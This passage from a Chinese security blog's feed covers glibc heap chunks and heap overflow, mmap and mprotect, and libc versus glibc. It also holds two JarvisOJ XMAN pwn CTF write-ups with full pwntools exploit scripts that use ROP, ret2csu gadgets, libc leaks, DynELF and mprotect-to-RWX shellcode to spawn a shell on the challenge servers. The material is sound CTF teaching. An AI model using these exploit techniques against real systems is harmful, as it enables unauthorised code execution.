*/</span></span><br><span class="line">  <span class="keyword">struct</span> malloc_chunk* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>字段解释：</p><p>prev_size，如果该chunk的物理相邻的前一地址chunk（两个指针的地址差值为前一chunk大小）是空闲的话，那该字段记录的是前一个chunk的大小（包括chunk头）。否则，该字段可以用来存储物理相邻的前一个chunk的数据。</p><p>size，该chunk的大小，大小必须是2*SIZE_SZ的整数倍。32位系统中，SIZE_SZ是4；64位系统中，SIZE_SZ是8。</p><ul><li>该字段的低三个比特位对chunk的大小没有影响，他们从高到低分别表示：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* NON_MAIN_ARENA，记录当前chunk是否不属于主线程，1表示不属于，0表示属于</span><br><span class="line">* IS_MAPPED，记录当前chunk是否是由mmap分配的</span><br><span class="line">* PREV_INUSE，记录前一个chunk块是否被分配，1表示被分配，0时可以通过prev_size字段来获取上一个chunk的大小及地址，这样方便进行空闲chunk之间的合并</span><br></pre></td></tr></table></figure><p>fd，bk。fd指向下一个（非物理相邻）空闲的chunk，bk指向上一个（非物理相邻）空闲的chunk。</p><p>fd_nextsize，bk_nextsize，只有chunk空闲的时候才使用，不过其用于较大的chunk。fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针。bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针。</p><h2 id="堆的操作"><a href="#堆的操作" class="headerlink" title="堆的操作"></a>堆的操作</h2><p>主要关注的是unlink，用来将一个双向链表（只存储空闲的chunk）中的一个元素取出来，应用场景有malloc、free、malloc_consolidate、realloc。</p><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（注意是可使用的字节数位不是用户申请的字节数，因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p><p>堆溢出策略有：</p><ul><li><p>覆盖与其物理相邻的下一个chunk的内容。</p></li><li><p>利用堆中机制（如unlink等）来实现任意地址写入（Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</p></li></ul><p>堆溢出中的几个重要步骤：</p><ul><li>寻找堆分配函数；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* malloc</span><br><span class="line">* calloc，在分配后会自动进行清空</span><br><span class="line">* realloc</span><br></pre></td></tr></table></figure><ul><li>寻找危险函数;</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* 输入 */</span><br><span class="line">* gets，直接读取一行，忽略’\x00’</span><br><span class="line">* scanf</span><br><span class="line">* vscanf</span><br><span class="line"></span><br><span class="line">/* 输出 */</span><br><span class="line">* sprintf</span><br><span class="line"></span><br><span class="line">/* 字符串 */</span><br><span class="line">* strcpy，字符串复制，遇到’\x00’停止</span><br><span class="line">* stract，字符串拼接，遇到’\x00’停止</span><br><span class="line">* bcopy</span><br></pre></td></tr></table></figure><ul><li>确定填充长度：计算开始写入的地址与所要覆盖的地址之间的距离。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN level5 の Write-Up</title>
      <link href="/2020/06/23/XMAN-level5/"/>
      <url>/2020/06/23/XMAN-level5/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这是JarvisOJ的PWN题部分[XMAN]level5的Write-Up。题目和level3_x64一样，只是禁用system和execve函数，让我们尝试使用mmap和mprotect函数。关于这两个函数背景知识可以参考<a href="https://coldwave96.github.io/2020/06/22/mmap/">Linux内存映射机制</a>。</p><span id="more"></span><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>总体思路很简单：</p><ul><li><p>分配一块内存buf并设置(mmap)&#x2F;修改(mprotect)这块内存属性为rwx</p></li><li><p>通过read函数将shellcode写到分配的buf中去</p></li><li><p>控制程序跳转到分配的buf中执行shellcode</p></li></ul><p>如果通过mmap函数实现：</p><ul><li><p>通过内存地址泄露获取libc加载基址</p></li><li><p>加上offset获得mmap函数在内存中真实地址</p></li><li><p>调用mmap函数设定buf长度和属性</p></li><li><p>将shellcode写入mmap函数返回的buf首地址</p></li><li><p>控制程序跳转到buf执行shellcode</p></li></ul><p>如果通过mprotect函数实现：</p><ul><li><p>通过内存地址泄露获取libc加载基址</p></li><li><p>加上offset获得mprotect函数在内存中真实地址</p></li><li><p>调用mprotect函数修改bss段的权限为rwx即7</p></li><li><p>将shellcode写入bss段</p></li><li><p>控制程序跳转到bss段执行shellcode</p></li></ul><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>这里简单点选择mprotect函数实现，因为mmap函数需要设置6个参数，而mprotect函数以及过程中会用到的read&#x2F;write函数都只需要设置3个参数。</p><p>由于是64位程序，所以需要通过寄存器传参。在程序中找了一下，发现只有万能Gadgets可以用。关于万能Gadgets，可以看一下我之前的<a href="https://coldwave96.github.io/2020/06/15/Useful-Gadgets/">ret2csu - 万能Gadgets</a>。</p><p>下面直接给出EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">* <span class="comment"># coding:utf-8</span></span><br><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="number">9884</span>)</span><br><span class="line">* </span><br><span class="line">* elf = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">* libc = ELF(<span class="string">&#x27;./libc-2.19.so&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">* write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">* vuln_addr = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* gadget1 = <span class="number">0x4006aa</span></span><br><span class="line">* gadget2 = <span class="number">0x400690</span></span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 泄露write函数地址</span></span><br><span class="line">* payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(gadget1)</span><br><span class="line">* payload1 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) <span class="comment"># 依次给rbx、rbp、r12、rdx、rsi、rdi赋值</span></span><br><span class="line">* payload1 += p64(gadget2)</span><br><span class="line">* payload1 += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span> <span class="comment"># padding</span></span><br><span class="line">* payload1 += p64(vuln_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">* sh.sendline(payload1)</span><br><span class="line">* write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">* </span><br><span class="line">* write_libc = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">* mprotect_libc = libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* bss_addr = <span class="number">0x600a88</span></span><br><span class="line">* read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">* read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># mprotect函数在内存中的真实地址</span></span><br><span class="line">* mprotect_addr = write_addr - write_libc + mprotect_libc</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 创建shellcode</span></span><br><span class="line">* shellcode = p64(mprotect_addr) + asm(shellcraft.amd64.sh())</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 调用read函数将shellcode写入bss段</span></span><br><span class="line">* payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(gadget1)</span><br><span class="line">* payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="built_in">len</span>(shellcode)) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload2 += p64(gadget2)</span><br><span class="line">* payload2 += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">* payload2 += p64(vuln_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">* sh.sendline(payload2)</span><br><span class="line">* sh.send(shellcode)</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 调用mprotect函数修改bss段权限，并控制程序跳转到bss段执行shellcode</span></span><br><span class="line">* payload3 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(gadget1)</span><br><span class="line">* payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) <span class="comment"># 跳转到bss端开始去执行mprotect函数</span></span><br><span class="line">* payload3 += p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>) <span class="comment"># mprotect函数的3个参数</span></span><br><span class="line">* payload3 += p64(gadget2)</span><br><span class="line">* payload3 += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">* payload3 += p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">* sh.sendline(payload3)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>EXP运行结果：</p><p><img src="/img/XMAN-level5/XMAN1.png"></p><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><p>关于mprotect函数的参数，第一个参数addr是内存页的首地址，内存是要求是以页为单位访问。一页是４kb也就是0x1000字节所以mprotect的第一个参数必须是0x1000的倍数，并且又要包含bss段，所以设置为0x600000。第二个参数是要设置的权限的地址的范围，也是页大小为单位，又需要能包含bss段，故而设置为最小单位0x1000。第三个参数就是具体属性，这里设置成RWX即7。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
            <tag> XMAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内存映射机制</title>
      <link href="/2020/06/22/mmap/"/>
      <url>/2020/06/22/mmap/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>在做PWN题的时候接触到内存映射，就去网上学习了一下Linux的内存映射机制，在这里做个笔记。不是很全面，仅仅是目前做题需要了解的知识。</p><span id="more"></span><h2 id="MMU"><a href="#MMU" class="headerlink" title="MMU"></a>MMU</h2><p>MMU是内存管理单元，主要功能有两个：</p><ul><li><p>负责虚拟地址到物理地址的转换</p></li><li><p>提供硬件机制的内存访问权限检查</p></li></ul><p>没有启动或者没有MMU时，外设（包括物理内存）等所有部件使用的都是物理地址，CPU通过物理地址来访问外设（包括物理内存）。启动MMU后，CPU核心对外发出虚拟地址给MMU，MMU把虚拟地址转换成物理地址，最后通过物理地址读取实际设备。</p><p>虚拟地址转换成物理地址的方法有：</p><ul><li><p>确定的公式转换</p></li><li><p>用表格存储虚拟地址对应的物理地址</p></li></ul><p>MMU内存映射机制实现不同的进程均可以访问所有的用户空间，同时不同的进程（页目录、页表不一样所以映射到的是不同的物理内存地址）又可以保存自己的私有数据。</p><h2 id="mmap-amp-amp-mprotect"><a href="#mmap-amp-amp-mprotect" class="headerlink" title="mmap &amp;&amp; mprotect"></a>mmap &amp;&amp; mprotect</h2><p>文件的内存映射可以理解为将文件想象成数据，把这块数据同程序中的一块内存对应起来，当操作这块内存的时候，就实际上在操作这个文件。</p><p>mmap函数将文件映射到进程地址空间，实现直接访问文件内容的功能。</p><p>read&#x2F;write函数在底层实际上是调用copy_to_user&#x2F;copy_from_user来实现，而实现过程是通过数据复制完成的。mmap函数因为建立了映射关系，可直接访问数据，所以提高了效率。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mmap</span><span class="params">(<span class="type">void</span>* addr, <span class="type">size_t</span> len, <span class="type">int</span> port, <span class="type">int</span> flag, <span class="type">int</span> filedes, <span class="type">off_t</span> offset）</span></span><br></pre></td></tr></table></figure><p>返回值：成功时返回被映射的内存地址，失败返回MAPP_FAILED。</p><p>参数解释：</p><ul><li><p>addr：这个参数告诉内核使用addr指定的值来映射指定文件的起始地址，只有极少数情况下不为0。当指定为0的时候，告诉内核返回什么地址内其自身决定。</p></li><li><p>len：指定被映射的内存区域的长度。</p></li><li><p>port：对应open函数的权限位：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PROT_READ  映射区可读</span><br><span class="line">PROT_WRITE 映射区可写</span><br><span class="line">PROT_EXEC  映射区可执行</span><br><span class="line">PROT_NONE  映射区不可访问</span><br></pre></td></tr></table></figure><p>由于只能映射已经打开的文件，所以这个权限位不能超出open函数指定的权限，比如说在open的时候指定为只读，那就不能在此时指定PORT_WRITE。</p><ul><li>flag：指定映射区的其它一些属性。例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MAP_ FIXED   针对addr属性，如果指定这个位，那么要求系统必需在指定的地址映射，这往往是不可取的。</span><br><span class="line">MAP_ SHARED  此标志说明指定映射区是共享的，意思就是说对内存的操作与对文件的操作是相对应的。</span><br><span class="line">MAP_ PRIVATE 该标志说明映射区是私用的，此时被映射的内存只能被当前里程使用，当进程操作的内存将会产生原文件的一个副本。</span><br></pre></td></tr></table></figure><ul><li><p>filedes：有效的文件描述符。一般是由open()函数返回，其值也可以设置为-1，此时需要指定flags参数中的MAP_ANON,表明进行的是匿名映射。</p></li><li><p>offset：被映射对象内容的起点。</p></li></ul><p>在mmap中有很多选项来控制最后得到的映射区的一些属性，在调用mmap函数之后，仍然可以通过mprotect函数对其中的一些属性进行调整。此外在更新了内存的内容之后，可以通过msync函数将更新的内容同步到磁盘中的文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span>* addr, <span class="type">size_t</span> len, <span class="type">int</span> port)</span></span><br></pre></td></tr></table></figure><p>返回值：成功返回0，失败返回-1。</p><p>参数解释：</p><ul><li><p>addr：mmap返回的数值，此时它就是mprotect作用的范围。</p></li><li><p>len：指定映射区的长度，它需要与mmap中指定相同。</p></li><li><p>port：把指定的属性施加于相应的映射区上。</p></li></ul><p>需要注意的是内核并不是实时同步映射区与文件的，相反内核很少主动去同步，除非我们调用了函数msync或者关闭映射区（关闭映射区的时候，也不是立即同步的）。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN level4 の Write-Up</title>
      <link href="/2020/06/22/XMAN-level4/"/>
      <url>/2020/06/22/XMAN-level4/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这是JarvisOJ的PWN题部分[XMAN]level4的Write-Up，题目思路上和level3一样，只不过在细节处理上有稍微的不一样。本题中由于不知道libc的版本，，所以需要pwntools的DynELF模块寻找函数的内存地址。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>程序运行图：</p><p><img src="/img/XMAN-level4/XMAN1.png"></p><p>checksec：32位程序，仅开启DEP保护</p><p><img src="/img/XMAN-level4/XMAN2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>把程序丢到hopper中，发现vulnerable_function函数中的read函数存在溢出漏洞：</p><p><img src="/img/XMAN-level4/XMAN3.png"></p><p>但是程序中既找不到system函数也找不到<code>/bin/sh</code>的字符串：</p><p><img src="/img/XMAN-level4/XMAN4.png"></p><p><img src="/img/XMAN-level4/XMAN5.png"></p><p>所以第一反应是和<a href="https://coldwave96.github.io/2020/05/20/XMAN-level3/">level3</a>一样，leak出libc地址然后调用libc中的system函数。</p><p>但是有个问题是我们不知道libc库的版本，所以我们需要通过pwntools的DynELF来寻找system函数的地址。</p><p>DynELF是pwntools中专门用来应对没有libc情况的漏洞利用模块，在提供一个目标程序任意地址内存泄露函数的情况下，可以解析任意加载库的人铱符号地址。具体原理解析可以看FREEBUF上的<a href="https://www.freebuf.com/articles/system/193646.html">Pwntools之DynELF原理探究</a>一文。</p><p>这样我们的思路就很清楚了：</p><ul><li><p>通过vulerable_function()的read()栈溢出构造ROP创造任意地址内存泄露函数</p></li><li><p>结合上一步的函数，利用DynELF获取libc中的system()函数的真实地址</p></li><li><p>通过vulerable_function()的read()栈溢出构造ROP将‘&#x2F;bin&#x2F;sh\x00’通过read()写入bss段</p></li><li><p>通过vulerable_function()的read()栈溢出构造ROP执行system(‘&#x2F;bin&#x2F;sh’)得到shell</p></li></ul><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>直接给出EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">* <span class="comment"># coding:utf-8</span></span><br><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="number">9880</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">* vuln_addr = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 定义leak()泄露任意函数地址</span></span><br><span class="line">* <span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">*     payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">*     sh.sendline(payload)</span><br><span class="line">*     leak_addr = sh.recv(<span class="number">4</span>)</span><br><span class="line">*     <span class="keyword">return</span> leak_addr</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 获取sysetem()函数地址</span></span><br><span class="line">* dynelf = DynELF(leak, elf = elf)</span><br><span class="line">* sys_addr = dynelf.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* <span class="built_in">print</span>(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(sys_addr))</span><br><span class="line">* </span><br><span class="line">* read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">* bss_addr = <span class="number">0x804a024</span></span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 往内存中写入shellcode</span></span><br><span class="line">* payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">* sh.sendline(payload1)</span><br><span class="line">* sh.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 执行system()函数get shell</span></span><br><span class="line">* payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bss_addr)</span><br><span class="line">* sh.sendline(payload2)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果图：</p><p><img src="/img/XMAN-level4/XMAN6.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
            <tag> XMAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libc &amp;&amp; glibc &amp;&amp; glib 杂谈</title>
      <link href="/2020/06/19/libc/"/>
      <url>/2020/06/19/libc/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这段时间学习PWN题的时候需要使用不同版本的libc库，导致在本地执行EXP脚本的时候总是失败，所以搜集了一些有关linux的C语言环境的资料。</p><span id="more"></span><h2 id="libc-amp-amp-glibc"><a href="#libc-amp-amp-glibc" class="headerlink" title="libc &amp;&amp; glibc"></a>libc &amp;&amp; glibc</h2><p>Linux平台提供的C标准库包括：</p><ul><li><p>一组头文件，定义了很多类型和宏，声明了很多库函数。这些头文件放在哪些目录下取决于不同的编译器，stdarg.h和stddef.h位于&#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;i486-linux-gnu&#x2F;4.3.2&#x2F;include目录下，stdio.h、stdlib.h、time.h、math.h、assert.h位于&#x2F;usr&#x2F;include目录下。C99标准定义的头文件有24个。</p></li><li><p>一组库文件，提供了库函数的实现。大多数库函数在libc共享库中，有些库函数在另外的共享库中，例如数学函数在libm中。通常libc共享库是&#x2F;lib&#x2F;libc.so.6。</p></li></ul><p>libc是Linux下的ANSI C函数库；glibc是Linux下的GUN C函数库。 glibc本身是GNU旗下的C标准库，后来逐渐成为了Linux的标准C库，而Linux下原来的标准C库Linux libc逐渐不再被维护。</p><p>Linux下面的标准C库不仅有这一个，如uclibc、klibc，以及上面被提到的Linux libc，但是glibc无疑是用得最多的。glibc在&#x2F;lib目录下的.so文件为libc.so.6。</p><h3 id="ANSI-C"><a href="#ANSI-C" class="headerlink" title="ANSI C"></a>ANSI C</h3><p>ANSI C函数库是基本的C语言函数库，包含了C语言最基本的库函数。这个库可以根据头文件划分为15个部分，其中包括：</p><ul><li><p>&lt;ctype.h&gt;：包含用来测试某个特征字符的函数的函数原型，以及用来转换大小写字母的函数原型；</p></li><li><p>&lt;errno.h&gt;：定义用来报告错误条件的宏；</p></li><li><p>&lt;float.h&gt;：包含系统的浮点数大小限制；</p></li><li><p>&lt;math.h&gt;：包含数学库函数的函数原型；</p></li><li><p>&lt;stddef.h&gt;：包含执行某些计算 C 所用的常见的函数定义；</p></li><li><p>&lt;stdio.h&gt;：包含标准输入输出库函数的函数原型，以及他们所用的信息；</p></li><li><p>&lt;stdlib.h&gt;：包含数字转换到文本，以及文本转换到数字的函数原型，还有内存分配、随机数字以及其他实用函数的函数原型；</p></li><li><p>&lt;string.h&gt;：包含字符串处理函数的函数原型；</p></li><li><p>&lt;time.h&gt;：包含时间和日期操作的函数原型和类型；</p></li><li><p>&lt;stdarg.h&gt;：包含函数原型和宏，用于处理未知数值和类型的函数的参数列表；</p></li><li><p>&lt;signal.h&gt;：包含函数原型和宏，用于处理程序执行期间可能出现的各种条件；</p></li><li><p>&lt;setjmp.h&gt;：包含可以绕过一般函数调用并返回序列的函数的原型，即非局部跳转；</p></li><li><p>&lt;locale.h&gt;：包含函数原型和其他信息，使程序可以针对所运行的地区进行修改。地区的表示方法可以使计算机系统处理不同的数据表达约定，如全世界的日期、时间、美元数和大数字；</p></li><li><p>&lt;assert.h&gt;：包含宏和信息，用于进行诊断，帮助程序调试。</p></li></ul><p>上述库函数在其各种支持C语言的IDE中都是有的。 </p><h3 id="GNU-C"><a href="#GNU-C" class="headerlink" title="GNU C"></a>GNU C</h3><p>GNU C函数库是一种类似于第三方插件的东西。由于Linux是用C语言写的，所以Linux的一些操作是用C语言实现的，因此，GUN组织开发了一个C语言的库 以便让我们更好的利用C语言开发基于Linux操作系统的程序。 不过现在的不同的Linux的发行版本对这两个函数库有不同的处理方法，有的可能已经集成在同一个库里了。</p><h2 id="glibc-amp-amp-glib"><a href="#glibc-amp-amp-glib" class="headerlink" title="glibc &amp;&amp; glib"></a>glibc &amp;&amp; glib</h2><p>不是长得像就是双胞胎。glib和glibc基本上没有太大联系，可能唯一的共同点就是，都是C编程需要调用的库而已。 </p><p>glib是Gtk+库和Gnome的基础。glib可以在多个平台下使用，比如Linux、Unix、Windows等。glib为许多标准的、常用的C语言结构提供了相应的替代物。 </p><p>它由基础类型、对核心应用的支持、实用功能、数据类型和对象系统五个部分组成，可以在<a href="http://www.gtk.org/">gtk网站</a>下载其源代码。是一个综合用途的实用的轻量级的C程序库，它提供C语言的常用的数据结构的定义、相关的处理函数，有趣而实用的宏，可移植的封装和一些运行时机能，如事件循环、线程、动态调用、对象系统等的API。GTK+是可移植的，当然glib也是可移植的，你可以在linux下，也可以在windows下使用它。使用gLib2.0（glib的2.0版本）编写的应用程序，在编译时应该在编译命令中加入<code>pkg-config --cflags --libs glib-2.0</code>，如：<code>gcc pkg-config --cflags --libs glib-2.0 hello.c -o hello</code></p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium の ret2csu</title>
      <link href="/2020/06/15/ret2csu/"/>
      <url>/2020/06/15/ret2csu/</url>
      
